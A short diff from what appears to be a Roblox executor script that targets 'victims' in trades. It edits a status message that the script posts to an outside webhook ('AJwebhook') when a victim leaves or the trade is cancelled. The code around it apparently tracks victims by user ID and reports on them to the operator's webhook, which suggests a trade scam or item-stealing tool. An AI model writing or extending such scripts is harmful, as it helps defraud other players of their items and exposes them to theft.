@@ -60,7 +60,7 @@ local autjoindata = isfile(filename) and readfile(filename)
 local victimuserid
 local function left()
     local Body = game:GetService("HttpService"):JSONEncode({
-        content = "Victim presumably left because the trade was cancelled or the victim was not found in the server."
+        content = "Victim presumably left because the trade was cancelled, the victim was not found in the server, or the script has been restarted in the same server as a previous victim."
     })
     http.request({
         Url = AJwebhook,
